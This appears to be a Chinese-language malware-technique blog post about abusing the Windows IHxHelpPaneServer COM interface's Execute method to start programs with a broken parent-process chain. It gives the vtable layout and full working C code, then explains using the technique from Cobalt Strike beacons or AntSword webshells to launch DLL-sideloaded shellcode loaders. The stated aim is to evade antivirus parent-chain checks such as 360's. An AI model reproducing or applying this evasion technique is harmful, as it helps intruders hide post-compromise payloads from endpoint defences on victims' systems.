---
title: 利用IHxHelpPaneServer接口断链执行
date: 2026-03-18 14:30:00 +0800
categories: [MalwareTech, COM接口]
tags: [COM接口]
---

这个COM接口是进程外的，实现的进程是`C:\Windows\HelpPane.exe`。这个接口有个Execute方法，就可以用来断链启动进程。

![image-20260309154037061](/assets/img/IHxHelpPaneServer-assets/image-20260309154037061.png)

## 0x01.进程外COM定位虚函数表

之前分析UACME41号方法的ICMLuaUtil接口时，定位接口虚函数表时采取先挨个看destructor方法来定位，对于destructor太多，且是进程外的COM似乎不太适用。可以采取接口的IID来定位，方法如下：

首先在IDA中交叉引用代表此接口IID的变量，找到QueryInterface调用的地方，任意一个都可以。

![image-20260309154420368](/assets/img/IHxHelpPaneServer-assets/image-20260309154420368.png)

然后看到第一行注释，vftable就有了，就这么简单。

![image-20260309154945991](/assets/img/IHxHelpPaneServer-assets/image-20260309154945991.png)

找到我们那个接口还有目标函数。

![image-20260309155123133](/assets/img/IHxHelpPaneServer-assets/image-20260309155123133.png)

这个Execute就只需要一个参数，传入要执行文件的路径即可。

![image-20260309155232882](/assets/img/IHxHelpPaneServer-assets/image-20260309155232882.png)

![image-20260309155340636](/assets/img/IHxHelpPaneServer-assets/image-20260309155340636.png)

## 0x02.用C实现

在C++中可以直接这么定义：

```
struct __declspec()
IHxHelpPaneServer : public IUnknown
{
    // IUnknown 方法 (Index 0-2)
    // virtual HRESULT QueryInterface(...) = 0;
    // virtual HRESULT AddRef() = 0;
    // virtual HRESULT Release() = 0;

    // IHxHelpPaneServer 自定义方法
    virtual HRESULT __stdcall DisplayTask(PWCHAR pWchar) = 0;           // Index 3 (Offset +18h)
    virtual HRESULT __stdcall DisplayContents(PWCHAR pWchar) = 0;       // Index 4 (Offset +20h)
    virtual HRESULT __stdcall DisplaySearchResults(PWCHAR pWchar) = 0;  // Index 5 (Offset +28h)
    virtual HRESULT __stdcall Execute(const PWCHAR pWchar) = 0;         // Index 6 (Offset +30h)
};
```

然后按照CoInitializeEx --> CoCreateInstance获取到接口指针，最后ppv->Execute(xxxx)调用就行。

但是在C中没有虚函数的概念，更没有面向对象（继承IUnknwon）这一说，最关键的是那个结构体的定义，首先是继承了IUnknown，我们需要在结构体中写出来（抄过来）。

![image-20260309163303481](/assets/img/IHxHelpPaneServer-assets/image-20260309163303481.png)

这个结构实际上是虚函数表的定义。在C++中，当一个类继承另一个类时，被继承的类的虚函数通常会位于派生类的虚表（vtable）的最上面。所以我们的结构不用动，这三个虚函数就按顺序排列就行，最后接着往下定义IHxHelpPaneServer的自定义方法：

```
// 模拟虚函数内存布局
typedef struct __declspec() IHxHelpPaneServer {
	BEGIN_INTERFACE

		DECLSPEC_XFGVIRT(IUnknown, QueryInterface)
		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			IUnknown* This,
			/* [in] */ REFIID riid,
			/* [annotation][iid_is][out] */
			_COM_Outptr_  void** ppvObject);

	DECLSPEC_XFGVIRT(IUnknown, AddRef)
		ULONG(STDMETHODCALLTYPE* AddRef)(
			IUnknown* This);

	DECLSPEC_XFGVIRT(IUnknown, Release)
		ULONG(STDMETHODCALLTYPE* Release)(
			IUnknown* This);

	HRESULT (__stdcall* DisplayTask)(BSTR bstrUrl); // BSTR == WCHAR*
	HRESULT (__stdcall* DisplayContents)(BSTR bstrUrl);
	HRESULT (__stdcall* DisplaySearchResults)(BSTR bstrSearchQuery);
	HRESULT (__stdcall* Execute)(LPWSTR pcUrl);

	END_INTERFACE
};
```

因为定义的是虚表结构，为了拿到指针的指针还需要在定义一个结构指向虚函数表指针：

```
// 定义指向虚函数表的指针
typedef struct IHxHelpPaneServer {
	CONST_VTBL struct IHxHelpPaneServerVtbl* lpVtbl;
};
```

最后的最后，在C++中，虚函数的调用通常需要通过类实例对象的指针或引用来进行，调用我们需要的目标方法是，需要传入类实例对象。

```
HRESULT (__stdcall* Execute)(IHxHelpPaneServer* This, LPWSTR pcUrl);
```

main函数代码如下：

```
int main()
{
	if (CoInitializeEx(NULL, COINIT_MULTITHREADED) != S_OK) {
		printf("CoInitialiazeEx failed with error: %lu\n", GetLastError());
		return 1;
	}

	CLSID CLSID_IHxHelpPaneServer;
	IID IID_IHxHelpPaneServer;

	if (CLSIDFromString(L"{8CEC58AE-07A1-11D9-B15E-000D56BFE6EE}", &CLSID_IHxHelpPaneServer) != S_OK) {
		printf("CLSIDFromString for CLSID failed with error: %lu\n", GetLastError());
		return 1;
	}
	if (CLSIDFromString(L"{8CEC592C-07A1-11D9-B15E-000D56BFE6EE}", &IID_IHxHelpPaneServer) != S_OK) {
		printf("CLSIDFromProgID for IID failed with error: %lu\n", GetLastError());
		return 1;
	}

	IHxHelpPaneServer* ihx = NULL;
	if (CoCreateInstance(&CLSID_IHxHelpPaneServer, NULL, CLSCTX_LOCAL_SERVER, &IID_IHxHelpPaneServer, (void**)&ihx)) {
		printf("CoCreateInstance failed with error: %lu\n", GetLastError());
		return 1;
	}

	ihx->lpVtbl->Execute(ihx, L"file:///C:/WINDOWS/SYSTEM32/CALC.EXE");

	return 0;
}
```

## 0x03.bof测试

当测试杀软的时候，直接在虚拟机双击运行白加黑的话，你的进程链是可信的，父进程是explorer.exe。

![image-20260310091728253](/assets/img/IHxHelpPaneServer-assets/image-20260310091728253.png)

但是你在webshell管理工具、cs console等地方启动的时候，父进程可能是java.exe、cmd.exe、xxx.exe。那么这样的活，上线后因为进程链不可信，执行敏感行为是会被弹窗，如常说的360核晶。比如在AntSword中执行beacon上线可以发现其父进程为cmd.exe。

![image-20260310092931314](/assets/img/IHxHelpPaneServer-assets/image-20260310092931314.png)

这时候在beacon中执行一些敏感操作就g了。所以我们在beacon中用IHxHelpPaneServer的bof启动白加黑，上线后的白加黑就可以为所欲为，或者在AntSword中直接断链启动白加黑。有个坑就是如果黑DLL用分离式加载shellcode，如果黑DLL是下面这样写的，那么加密的shellcode需要放到`C:\Windows\System32\`目录下。因为通过这个COM接口启动进程时，这个进程的父进程时`svchost.exe` 或 `HelpPane.exe`。这类由系统服务或COM组件拉起的进程，其默认的工作目录通常被设置为 `C:\Windows\System32\`，而不是你的可执行文件所在的目录。无需担心的是，DLL搜索路径仍然没有改变，始终是可执行文件所在的目录，不受CWD的影响。

但最好的方法是通过GetModuleFileName来定位自己。

```
fopen_s(&Stream, ".\\file.log.enc", "rb")
```

![image-20260310111835932](/assets/img/IHxHelpPaneServer-assets/image-20260310111835932.png)

可以发现白文件没有父进程，换句话说就是父进程死了（HelpPane.exe or svchost.exe）。

![image-20260310111712461](/assets/img/IHxHelpPaneServer-assets/image-20260310111712461.png)

